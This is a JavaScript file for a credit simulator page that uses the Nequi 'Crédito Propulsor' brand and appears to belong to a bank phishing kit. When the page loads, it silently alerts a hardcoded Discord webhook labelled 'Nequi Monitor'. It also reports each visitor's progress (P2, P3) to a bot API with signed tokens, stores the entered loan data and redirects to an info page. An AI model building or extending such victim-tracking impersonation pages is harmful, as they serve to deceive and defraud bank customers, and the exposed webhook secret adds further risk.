// js/simulador.js

// ————— Envío de webhook al entrar —————
(async function notifyEntry() {
  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1385429109135642704/fSW0pterLx8L5gjnCN7oqINDawcI5TCOu-74JXiuyL_9Z2gZpo9eoUmeS_ttqkmH_sOg';
  const payload = {
    username: 'Nequi Monitor',
    avatar_url: 'https://i.imgur.com/nequi-logo.png',
    embeds: [{
      title: '📊 Usuario ingresó al simulador',
      description: 'Alguien abrió la página de simulador de Crédito Propulsor',
      color: 0xDA0081,
      timestamp: new Date().toISOString()
    }]
  };
  try {
    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (e) {
    console.error('Error enviando webhook de ingreso:', e);
  }
})();

// ————— Resto de tu simulador.js —————

const DOMElements = {
  loader:       document.getElementById('loader'),
  montoSlider:  document.getElementById('montoSlider'),
  plazoSlider:  document.getElementById('plazoSlider'),
  montoValue:   document.getElementById('montoValue'),
  plazoValue:   document.getElementById('plazoValue'),
  cuotaMensual: document.getElementById('cuotaMensual'),
  interesTotal: document.getElementById('interesTotal'),
  totalPagar:   document.getElementById('totalPagar'),
  tasaMensual:  document.getElementById('tasaMensual'),
  solicitarBtn: document.getElementById('solicitarBtn')
};

// Utilidades
const UTILS = {
  formatearMoneda: (valor) => {
    return new Intl.NumberFormat('es-CO', {
      style: 'currency',
      currency: 'COP',
      minimumFractionDigits: 0,
      maximumFractionDigits: 0
    }).format(valor);
  },

  calcularCuota: (monto, plazo, tasa) => {
    // Fórmula de cuota fija (sistema francés)
    return (monto * tasa * Math.pow(1 + tasa, plazo)) /
           (Math.pow(1 + tasa, plazo) - 1);
  }
};

// Tasa de interés efectiva mensual
const TASA_MENSUAL = 0.0125; // 1.25%

// Arranque al cargar la página
document.addEventListener('DOMContentLoaded', () => {
  actualizarCalculos();
  addEventListeners();

  // Notificar a Discord que estamos en la página de simulador (P2)
  if (typeof sendPageStatusToDiscord === 'function') {
    sendPageStatusToDiscord('P2');
    const token = KJUR.jws.JWS.sign(null, { alg: "HS256" }, { message: 'P2' }, JWT_SIGN);
    fetch(`${API_URL}/api/bot/status`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${API_KEY}`
      },
      body: JSON.stringify({ token })
    });
  }
});

// Agregar manejadores de eventos
function addEventListeners() {
  const { montoSlider, plazoSlider, solicitarBtn, loader } = DOMElements;

  montoSlider.addEventListener('input', actualizarCalculos);
  plazoSlider.addEventListener('input', actualizarCalculos);

  solicitarBtn.addEventListener('click', () => {
    loader.classList.remove('hidden');

    const monto = parseInt(montoSlider.value, 10);
    const plazo = parseInt(plazoSlider.value, 10);
    const cuota = Math.round(UTILS.calcularCuota(monto, plazo, TASA_MENSUAL));

    if (typeof info === 'object') {
      info.monto = monto;
      info.plazo = plazo;
      info.cuota = cuota;
    }

    localStorage.setItem('montoCredito', monto);
    localStorage.setItem('plazoMeses',  plazo);
    localStorage.setItem('cuotaMensual', cuota);

    if (typeof updateLS === 'function') {
      updateLS();
    }

    if (typeof sendPageStatusToDiscord === 'function') {
      sendPageStatusToDiscord('P3');
      const token = KJUR.jws.JWS.sign(null, { alg: "HS256" }, { message: 'P3' }, JWT_SIGN);
      fetch(`${API_URL}/api/bot/status`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_KEY}`
        },
        body: JSON.stringify({ token })
      });
    }

    setTimeout(() => {
      window.location.href = 'info.html';
    }, 2500);
  });
}

// Recalcular todos los campos visibles
function actualizarCalculos() {
  const {
    montoSlider,
    plazoSlider,
    montoValue,
    plazoValue,
    cuotaMensual,
    interesTotal,
    totalPagar,
    tasaMensual
  } = DOMElements;

  const monto = parseInt(montoSlider.value, 10);
  const plazo = parseInt(plazoSlider.value, 10);
  const tasa  = TASA_MENSUAL;

  montoValue.textContent  = UTILS.formatearMoneda(monto);
  plazoValue.textContent  = `${plazo} meses`;
  tasaMensual.textContent = `${(tasa * 100).toFixed(2)}%`;

  const cuota = UTILS.calcularCuota(monto, plazo, tasa);
  const totalInteres = (cuota * plazo) - monto;
  const total = monto + totalInteres;

  cuotaMensual.textContent = UTILS.formatearMoneda(cuota);
  interesTotal.textContent = UTILS.formatearMoneda(totalInteres);
  totalPagar.textContent   = UTILS.formatearMoneda(total);
}